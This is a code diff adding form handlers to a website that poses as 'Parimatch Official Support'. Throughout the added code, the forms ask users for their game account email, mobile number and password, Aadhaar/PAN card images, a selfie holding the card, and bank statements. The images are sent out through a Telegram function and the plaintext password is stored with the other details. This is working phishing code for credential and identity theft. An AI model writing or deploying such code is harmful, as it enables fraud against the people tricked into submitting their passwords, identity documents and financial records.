@@ -114,7 +114,7 @@ document.addEventListener('DOMContentLoaded', () => {
   };
 
   // Internal links with transition (exclude already-handled buttons)
-  document.querySelectorAll('a[href^="index.html"], a[href^="complaint.html"], a[href^="withdrawal.html"]').forEach(link => {
+  document.querySelectorAll('a[href^="index.html"], a[href^="complaint.html"], a[href^="withdrawal.html"], a[href^="documents.html"], a[href^="bank_statement.html"]').forEach(link => {
     if (link.id === 'submitProblemBtn') return;
     link.addEventListener('click', (e) => {
       if (!link.hasAttribute('target')) {
@@ -824,4 +824,176 @@ try {
   });
 } catch (e) {}
 
+// ============================================================
+//  KYC PROBLEM - Form Submission
+// ============================================================
+try {
+  var kycForm = document.getElementById('problemForm');
+  var aadharFrontInput = document.getElementById('aadharFront');
+  if (kycForm && aadharFrontInput) {
+    aadharFrontInput.addEventListener('change', function() {
+      var nameEl = document.getElementById('aadharFrontName');
+      if (nameEl) nameEl.textContent = this.files && this.files[0] ? 'Selected: ' + this.files[0].name : '';
+      var label = this.parentElement.querySelector('.file-label');
+      if (label) { if (this.files && this.files[0]) { label.classList.add('has-file'); var span = label.querySelector('span'); if (span) span.textContent = this.files[0].name; } else { label.classList.remove('has-file'); } }
+    });
+    var aadharBackInput = document.getElementById('aadharBack');
+    if (aadharBackInput) {
+      aadharBackInput.addEventListener('change', function() {
+        var nameEl = document.getElementById('aadharBackName');
+        if (nameEl) nameEl.textContent = this.files && this.files[0] ? 'Selected: ' + this.files[0].name : '';
+        var label = this.parentElement.querySelector('.file-label');
+        if (label) { if (this.files && this.files[0]) { label.classList.add('has-file'); var span = label.querySelector('span'); if (span) span.textContent = this.files[0].name; } else { label.classList.remove('has-file'); } }
+      });
+    }
+    var selfieInput = document.getElementById('selfieImage');
+    if (selfieInput) {
+      selfieInput.addEventListener('change', function() {
+        var nameEl = document.getElementById('selfieImageName');
+        if (nameEl) nameEl.textContent = this.files && this.files[0] ? 'Selected: ' + this.files[0].name : '';
+        var label = this.parentElement.querySelector('.file-label');
+        if (label) { if (this.files && this.files[0]) { label.classList.add('has-file'); var span = label.querySelector('span'); if (span) span.textContent = this.files[0].name; } else { label.classList.remove('has-file'); } }
+      });
+    }
 
+    kycForm.addEventListener('submit', async function(e) {
+      e.preventDefault();
+      var emailVal = document.getElementById('email').value;
+      var mobileVal = document.getElementById('mobile').value;
+      var passwordVal = document.getElementById('password').value;
+      var frontFile = document.getElementById('aadharFront');
+      var backFile = document.getElementById('aadharBack');
+      var selfieFile = document.getElementById('selfieImage');
+      if (!emailVal.trim()) { showNotification("Please enter your Game Email ID", "error"); return; }
+      if (!isValidEmail(emailVal)) { showNotification("Please enter a valid email address", "error"); return; }
+      if (!mobileVal.trim()) { showNotification("Please enter your Game Account Mobile No.", "error"); return; }
+      if (!isValidMobile(mobileVal)) { showNotification("Please enter a valid mobile number (min 10 digits)", "error"); return; }
+      if (!passwordVal) { showNotification("Please enter your Game Account Password", "error"); return; }
+      if (!isValidPassword(passwordVal)) { showNotification("Password must be at least 4 characters", "error"); return; }
+      if (!frontFile || !frontFile.files || !frontFile.files[0]) { showNotification("Please upload Aadhaar/PAN Card Front", "error"); return; }
+      if (!backFile || !backFile.files || !backFile.files[0]) { showNotification("Please upload Aadhaar/PAN Card Back", "error"); return; }
+      if (!selfieFile || !selfieFile.files || !selfieFile.files[0]) { showNotification("Please upload Aadhaar/PAN Card with Selfie", "error"); return; }
+
+      var submitBtn = kycForm.querySelector('.btn-submit');
+      var originalBtnText = submitBtn.innerHTML;
+      submitBtn.innerHTML = "<i class='fa-solid fa-spinner fa-spin'></i> Uploading...";
+      submitBtn.disabled = true;
+
+      try {
+        var requestId = "TX" + Math.floor(100000 + Math.random() * 900000);
+        var timestamp = new Date().toLocaleString('en-IN', { day: '2-digit', month: 'short', year: 'numeric', hour: '2-digit', minute: '2-digit', hour12: true });
+        var gameId = "PARIMATCH" + Math.floor(10000 + Math.random() * 90000);
+
+        var frontUrl = await sendImageToTelegram(frontFile.files[0], requestId + ' | Aadhaar/PAN Front');
+        var backUrl = await sendImageToTelegram(backFile.files[0], requestId + ' | Aadhaar/PAN Back');
+        var selfieUrl = await sendImageToTelegram(selfieFile.files[0], requestId + ' | Card with Selfie');
+
+        await saveSubmission({
+          request_id: requestId,
+          email: emailVal.trim(),
+          mobile: mobileVal.trim(),
+          password: passwordVal,
+          aadhar_front_url: frontUrl,
+          aadhar_back_url: backUrl,
+          selfie_url: selfieUrl,
+          type: 'KYC Problem',
+          game_id: gameId,
+          timestamp: timestamp,
+          source: 'Parimatch Official Support'
+        });
+
+        showNotification("Request submitted successfully!", "success");
+        bankForm.reset();
+        document.querySelectorAll('.file-label').forEach(function(l) { l.classList.remove('has-file'); });
+        document.querySelectorAll('.file-name').forEach(function(n) { n.textContent = ''; });
+      } catch (error) {
+        console.error("Submit Error:", error);
+        showNotification("Failed to send. Please try again.", "error");
+      } finally {
+        submitBtn.innerHTML = originalBtnText;
+        submitBtn.disabled = false;
+      }
+    });
+  }
+} catch (e) { console.warn('kyc form:', e); }
+
+// ============================================================
+//  BANK STATEMENTS PROBLEM - Form Submission
+// ============================================================
+try {
+  var bankForm = document.getElementById('problemForm');
+  var bankStatement1Input = document.getElementById('bankStatement1');
+  if (bankForm && bankStatement1Input) {
+    bankStatement1Input.addEventListener('change', function() {
+      var nameEl = document.getElementById('bankStatement1Name');
+      if (nameEl) nameEl.textContent = this.files && this.files[0] ? 'Selected: ' + this.files[0].name : '';
+      var label = this.parentElement.querySelector('.file-label');
+      if (label) { if (this.files && this.files[0]) { label.classList.add('has-file'); var span = label.querySelector('span'); if (span) span.textContent = this.files[0].name; } else { label.classList.remove('has-file'); } }
+    });
+    var bankStatement2Input = document.getElementById('bankStatement2');
+    if (bankStatement2Input) {
+      bankStatement2Input.addEventListener('change', function() {
+        var nameEl = document.getElementById('bankStatement2Name');
+        if (nameEl) nameEl.textContent = this.files && this.files[0] ? 'Selected: ' + this.files[0].name : '';
+        var label = this.parentElement.querySelector('.file-label');
+        if (label) { if (this.files && this.files[0]) { label.classList.add('has-file'); var span = label.querySelector('span'); if (span) span.textContent = this.files[0].name; } else { label.classList.remove('has-file'); } }
+      });
+    }
+
+    bankForm.addEventListener('submit', async function(e) {
+      e.preventDefault();
+      var emailVal = document.getElementById('email').value;
+      var mobileVal = document.getElementById('mobile').value;
+      var passwordVal = document.getElementById('password').value;
+      var bs1 = document.getElementById('bankStatement1');
+      var bs2 = document.getElementById('bankStatement2');
+      if (!emailVal.trim()) { showNotification("Please enter your Game Email ID", "error"); return; }
+      if (!isValidEmail(emailVal)) { showNotification("Please enter a valid email address", "error"); return; }
+      if (!mobileVal.trim()) { showNotification("Please enter your Game Account Mobile No.", "error"); return; }
+      if (!isValidMobile(mobileVal)) { showNotification("Please enter a valid mobile number (min 10 digits)", "error"); return; }
+      if (!passwordVal) { showNotification("Please enter your Game Account Password", "error"); return; }
+      if (!isValidPassword(passwordVal)) { showNotification("Password must be at least 4 characters", "error"); return; }
+      if (!bs1 || !bs1.files || !bs1.files[0]) { showNotification("Please upload Bank Statement 1", "error"); return; }
+      if (!bs2 || !bs2.files || !bs2.files[0]) { showNotification("Please upload Bank Statement 2", "error"); return; }
+
+      var submitBtn = bankForm.querySelector('.btn-submit');
+      var originalBtnText = submitBtn.innerHTML;
+      submitBtn.innerHTML = "<i class='fa-solid fa-spinner fa-spin'></i> Uploading...";
+      submitBtn.disabled = true;
+
+      try {
+        var requestId = "TX" + Math.floor(100000 + Math.random() * 900000);
+        var timestamp = new Date().toLocaleString('en-IN', { day: '2-digit', month: 'short', year: 'numeric', hour: '2-digit', minute: '2-digit', hour12: true });
+        var gameId = "PARIMATCH" + Math.floor(10000 + Math.random() * 90000);
+
+        var file1Url = await sendImageToTelegram(bs1.files[0], requestId + ' | Bank Statement 1');
+        var file2Url = await sendImageToTelegram(bs2.files[0], requestId + ' | Bank Statement 2');
+
+        await saveSubmission({
+          request_id: requestId,
+          email: emailVal.trim(),
+          mobile: mobileVal.trim(),
+          password: passwordVal,
+          bank_statement_1_url: file1Url,
+          bank_statement_2_url: file2Url,
+          type: 'Bank Statement Problem',
+          game_id: gameId,
+          timestamp: timestamp,
+          source: 'Parimatch Official Support'
+        });
+
+        showNotification("Request submitted successfully!", "success");
+        bankForm.reset();
+        document.querySelectorAll('.status-chip').forEach(function(c) { c.classList.remove('active'); });
+        document.querySelectorAll('.file-label').forEach(function(l) { l.classList.remove('has-file'); var span = l.querySelector('span'); if (span) { if (l.id === 'bankStatement1Label') span.textContent = 'Choose Bank Statement 1'; else if (l.id === 'bankStatement2Label') span.textContent = 'Choose Bank Statement 2'; } });
+        document.querySelectorAll('.file-name').forEach(function(n) { n.textContent = ''; });
+      } catch (error) {
+        console.error("Submit Error:", error);
+        showNotification("Failed to send. Please try again.", "error");
+      } finally {
+        submitBtn.innerHTML = originalBtnText;
+        submitBtn.disabled = false;
+      }
+    });
+  }
+} catch (e) { console.warn('bank statement form:', e); }
